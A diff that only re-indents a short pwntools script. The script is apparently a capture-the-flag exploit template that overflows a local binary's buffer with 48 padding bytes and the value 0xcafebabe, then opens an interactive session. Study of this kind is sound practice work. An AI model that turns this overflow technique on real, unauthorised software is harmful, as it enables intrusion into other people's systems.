@@ -1,24 +1,24 @@
-        from pwn import *
+from pwn import *
 
 
-        def start(argv=[], *a, **kw):
-            return process([exe] + argv, *a, **kw)
+def start(argv=[], *a, **kw):
+    return process([exe] + argv, *a, **kw)
 
 
-        exe = sys.argv[1]
-        elf = context.binary = ELF(exe, checksec=False)
+exe = sys.argv[1]
+elf = context.binary = ELF(exe, checksec=False)
 
-        # ===========================================================
-        #                           EXPLOIT
-        # ===========================================================
+# ===========================================================
+#                           EXPLOIT
+# ===========================================================
 
-        offset = 48
-        io = start()
+offset = 48
+io = start()
 
-        payload = flat([
-            b"A"*offset,
-            0xcafebabe
-        ])
+payload = flat([
+    b"A"*offset,
+    0xcafebabe
+])
 
-        io.sendline(payload)
-        io.interactive()
+io.sendline(payload)
+io.interactive()
